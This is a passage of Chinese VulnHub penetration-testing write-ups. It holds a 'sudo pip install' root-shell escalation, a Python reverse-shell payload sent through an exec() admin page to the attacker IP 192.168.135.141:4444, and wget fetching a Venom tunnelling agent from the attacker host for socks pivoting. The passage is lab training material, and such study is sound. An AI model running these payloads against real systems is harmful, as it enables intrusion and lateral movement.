id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p><strong>1、sudo 允许一个被批准的用户以其他用户的身份去执行命令：</strong></p><blockquote><p>原文链接：<a href="https://blog.csdn.net/humanhaunt/article/details/120414681">https://blog.csdn.net/humanhaunt/article/details/120414681</a></p></blockquote><p>我们直接略过上边的部分，直接看 <strong>”# User privilege specification”</strong> 用户权限定义部分</p><p>大致可以描述为：<strong>who where whom command</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root    ALL=(ALL:ALL)  ALL<br></code></pre></td></tr></table></figure><ul><li><p>root 表示root用户</p></li><li><p>ALL 表示从任何的主机都可以执行，也可以这样192.168.100.0/24</p></li><li><p>(ALL:ALL) 是以谁的身份来执行，ALL:ALL 就表示 root 可以以任何人的身份来执行命令，第一个 ALL 是用户，第二个 ALL 是组</p></li><li><p>ALL 表示任何命令</p></li></ul><p>那么整条规则就是 root 用户可以在任何主机以任何人的身份来执行所有的命令。</p><p>在看下面这个定义：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 允许 wheel 组中的所有人运行所有的命令，这就可以说明把用户加入到 wheel 组就可以使用 sudo 命令</span><br><span class="hljs-meta">%</span><span class="bash">wheel  ALL=(ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 只允许 nick 用户在 192.168.10.0/24 网段上连接主机并且以 root 权限执行 useradd 命令</span><br>nick   192.168.10.0/24=(root)  /usr/sbin/useradd<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> sudoers 配置可以在命令部分附加选项，比如设置执行 sudo 时不需要输入密码</span><br>nick ALL=(ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p><strong>/etc/sudoers：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/sudoers</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="hljs-meta">#</span><span class="bash"> directly modifying this file.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">Defaults        env_reset</span><br>Defaults        mail_badpass<br>Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Host <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Cmnd <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br>icex64 ALL=(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>arsene ALL=(root) NOPASSWD: /usr/bin/pip<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="hljs-built_in">command</span></span><br><span class="hljs-meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> See sudoers(5) <span class="hljs-keyword">for</span> more information on <span class="hljs-string">&quot;@include&quot;</span> directives:</span><br><br>@includedir /etc/sudoers.d<br></code></pre></td></tr></table></figure><p><strong>2、pip sudo 提权：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> TF=$(mktemp -d)</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip install <span class="hljs-variable">$TF</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> mktemp: 创建临时文件或者目录，这样的创建方式是安全的。-d: 目录</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span></span><br>/tmp/tmp.D5iHBC0ZvC<br><span class="hljs-meta">#</span><span class="bash"> $()与 `` (反引号)：返回括号中命令的结果</span><br><span class="hljs-meta">#</span><span class="bash"> 在bash中，$()与 ``（反引号）都是用来作命令替换的，执行括号或者反引号中的命令。</span><br><span class="hljs-meta">#</span><span class="bash"> 命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BoredHackerBlog：Social Network</title>
    <link href="/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/"/>
    <url>/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0F-BoredHackerBlog-Social-Network-vulnhub"><a href="#0x0F-BoredHackerBlog-Social-Network-vulnhub" class="headerlink" title="0x0F BoredHackerBlog: Social Network~vulnhub"></a>0x0F BoredHackerBlog: Social Network~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">BoredHackerBlog: Social Network ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.151</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.151</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.151</span>  <br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 05:10 EDT<br>Nmap scan report for 192.168.135.151<br>Host is up (0.00082s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 cc:53:20:b8:10:db:52:5f:16:02:bc:ee:57:22:80:e1 (DSA)<br>|   2048 01:50:f6:1f:32:e8:0d:fc:48:38:3e:c8:1b:ac:20:02 (RSA)<br>|   256 3b:ae:9a:bd:cb:ff:8f:54:64:32:ec:bf:38:fd:fe:6b (ECDSA)<br>|_  256 77:4e:8b:20:73:52:a4:ee:93:1d:b3:85:f2:25:d7:55 (ED25519)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>|_http-server-header: Werkzeug/0.14.1 Python/2.7.15<br>|_http-title: Leave a message<br>MAC Address: 00:0C:29:A9:17:61 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.82 ms 192.168.135.151<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>5000/tcp</td><td>open</td><td>http</td><td>Werkzeug httpd 0.14.1 (Python 2.7.15)</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>5000端口</strong></p><p>访问发现是个留言网站，尝试 SSTI（模板注入），输入了 <code>&#123;&#123;2*2&#125;&#125;</code> 发现不生效 。</p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.151:5000</span><br>-----------------<br>URL_BASE: http://192.168.135.151:5000/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.151:5000/ ----<br>+ http://192.168.135.151:5000/admin (CODE:200|SIZE:401)<br></code></pre></td></tr></table></figure><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>访问 <code>http://192.168.135.151:5000/admin</code> ，感觉好像可以执行代码：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Admin page<br>Code testing page<br>Status:<br>Nothing was ran. Input some code to exec()<br><br><span class="hljs-section">Code input:</span><br><span class="hljs-section">----------</span><br><span class="hljs-section">Test code</span><br><span class="hljs-section">----------</span><br><span class="hljs-code"> _________________</span><br><span class="hljs-code"> Enter code here</span><br><span class="hljs-code"> _________________</span><br></code></pre></td></tr></table></figure><p>尝试 python 反弹 shell ：</p><blockquote><p><a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 不可</span><br>import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>fd0d94202670c274cffc4fad433de106  -<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>58a4412023c9b9c631546c19bc4f6c0c  -<br></code></pre></td></tr></table></figure><p>nc 监听，成功反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.151] 53558<br>/app # whoami<br>root<br>/app # id<br>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br>/app # ls -l<br>total 16<br>-rw-r--r--    1 root     root           182 Oct 29  2018 Dockerfile<br>-rw-r--r--    1 root     root          1326 Oct 29  2018 main.py<br>-rw-r--r--    1 root     root             6 Oct 28  2018 requirements.txt<br>drwxr-xr-x    2 root     root          4096 Oct 29  2018 templates<br></code></pre></td></tr></table></figure><p>这个时候，首先发现得到的 shell 的行头是：/app #，查看当前目录的文件时发现了 Dockerfile，让人怀疑自己是在 docker 里面。</p><blockquote><p>方法1：如果根目录下存在 dockerenv，那么有极大的概率，我们是在 docker 环境中<br>方法2：查看 ip，如果 ip 与网站 ip 不同，那么有极大的概率，我们是在 docker 环境中<br>方法3：如果 /proc/1/cgroup 文件里面可以看到 docker，以及 docker 的 hash 值。那么我们一定在 docker 环境中。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # ls /.dockerenv<br>/.dockerenv<br>/app # ip addr<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>6: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP <br>    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>/app # ifconfig     <br>eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  <br>          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:26237 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:25914 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:2396416 (2.2 MiB)  TX bytes:3539722 (3.3 MiB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<br><br>/app # cat /proc/1/cgroup<br>11:hugetlb:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>10:perf_event:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>9:blkio:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>8:freezer:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>7:devices:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>6:memory:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>5:cpuacct:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>4:cpu:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>3:cpuset:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>2:name=systemd:/docker/b112bfb5d3eed7def86a8c80f07cdb1c5cff808f3c7865f4c8f28d8acc22eeef<br>/app # <br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote><p><a href="https://www.jianshu.com/p/1c818749e5b7">No.1：vulhub blog-social-network - 简书 (jianshu.com)</a><br><a href="https://blog.csdn.net/weixin_44288604/article/details/125318405">Vulnhub靶机：BOREDHACKERBLOG: SOCIAL NETWORK_lainwith的博客-CSDN博客</a></p></blockquote><h3 id="1、内网渗透"><a href="#1、内网渗透" class="headerlink" title="1、内网渗透"></a>1、内网渗透</h3><ul><li>基本原理：使用代理工具，建立 kali 与内网机器的一条隧道，将 kali 与内网机器打通，kali 中的工具可以通过该隧道进行工作。</li><li>Vemon 基本步骤：<ul><li>将 agent 拷贝到目标主机，赋予可执行权限</li><li>开启 vemon 服务端：<code>./admin_linux_x64 -lport 9999</code></li><li>开启 vemon 客户端：<code>./a -rhost 192.168.135.1041 -rport 9999</code></li></ul></li></ul><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # for i in $(seq 1 4); do ping -c 1 172.17.0.$i; done<br>PING 172.17.0.1 (172.17.0.1): 56 data bytes<br>64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.631 ms<br><br>--- 172.17.0.1 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.631/0.631/0.631 ms<br>PING 172.17.0.2 (172.17.0.2): 56 data bytes<br>64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.507 ms<br><br>--- 172.17.0.2 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.507/0.507/0.507 ms<br>PING 172.17.0.3 (172.17.0.3): 56 data bytes<br>64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.025 ms<br><br>--- 172.17.0.3 ping statistics ---<br>1 packets transmitted, 1 packets received, 0% packet loss<br>round-trip min/avg/max = 0.025/0.025/0.025 ms<br>PING 172.17.0.4 (172.17.0.4): 56 data bytes<br><br><br>--- 172.17.0.4 ping statistics ---<br>1 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure><h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>通过 ping 命令，发现内网中存在别的主机，如果我想探测内网的实际情况，包括存活主机有哪些、分别开放了哪些端口，那么就必须穿透内网，才能实现内网探测。</p><p>内网穿透可选的工具有很多，这里我采用 Venom，你可以在它的 github 主页看到中文使用指南：<a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p><strong>1、判断靶机位数</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # uname -a<br>Linux dbca22cf339d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 Linux<br></code></pre></td></tr></table></figure><p>得知目标是 64 位系统 。</p><p><strong>2、投递 venom</strong></p><p>在 kali 上面使用 python 开启一个 HTTP 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [01/Jul/2022 21:40:58] &quot;GET /tools/Venom/agent_linux_x64 HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>靶机使用 wget 命令下载代理工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # wget http://192.168.135.141:8888/tools/Venom/agent_linux_x64<br>Connecting to 192.168.135.141:8888 (192.168.135.141:8888)<br>agent_linux_x64      100% |*******************************|  3791k  0:00:00 ETA<br></code></pre></td></tr></table></figure><p><strong>3、运行 venom</strong></p><p>kali 开启监听，等待目标的容器系统跟 kali 建立连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure><p>靶机运行代理工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/app # chmod +x agent_linux_x64<br>/app # ./agent_linux_x64 -rhost 192.168.135.141 -rport 9999<br>2022/07/02 09:45:31 [+]Successfully connects to a new node<br></code></pre></td></tr></table></figure><p>kali 连接成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./admin_linux_x64 -lport 9999</span><br>Venom Admin Node Start...<br><br>  ____   ____  &#123; v1.1  author: Dlive &#125;<br>  \   \ /   /____   ____   ____   _____<br>   \   Y   // __ \ /    \ /    \ /     \<br>    \     /\  ___/|   |  (  &lt;_&gt; )  Y Y  \<br>     \___/  \___  &gt;___|  /\____/|__|_|  /<br>                \/     \/             \/<br><br>(admin node) &gt;&gt;&gt; <br>[+]Remote connection:  192.168.135.151:35936<br>[+]A new node connect to admin node success<br>(admin node) &gt;&gt;&gt; show# show 显示网络拓扑,下面的拓扑图表示，admin 节点下连接了 1 节点<br>A# A 表示 admin 节点<br>+ -- 1# 数字表示 agent 节点<br>(admin node) &gt;&gt;&gt; goto 1# goto 操作某节点<br>node 1<br>(node 1) &gt;&gt;&gt; socks 1080# socks 建立到某节点的 socks5 代理<br>a socks5 proxy of the target node has started up on the local port 1080.<br>(node 1) &gt;&gt;&gt; <br></code></pre></td></tr></table></figure><p>执行成功 socks 命令之后，会在 admin 节点本地开启一个端口，通过 1080 端口即可进行 socks5 代理</p><p><strong>4、配置socks代理</strong></p><p>虽然我们建立到某节点的 socks5 代理，我们还需要 proxychains4 来挂载这个代理，才能让 nmap 等工具可以使用该代理去攻击目标。</p><p>配置 proxychains4.conf ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/proxychains4.conf</span>        <br>[sudo] password for kali: <br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> tail -5 /etc/proxychains4.conf</span> <br><span class="hljs-meta">#</span><span class="bash"> add proxy here ...</span><br><span class="hljs-meta">#</span><span class="bash"> meanwile</span><br><span class="hljs-meta">#</span><span class="bash"> defaults <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;tor&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> socks4        127.0.0.1 9050</span><br>socks5 127.0.0.1 1080<br></code></pre></td></tr></table></figure><h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>在上文使用 ping 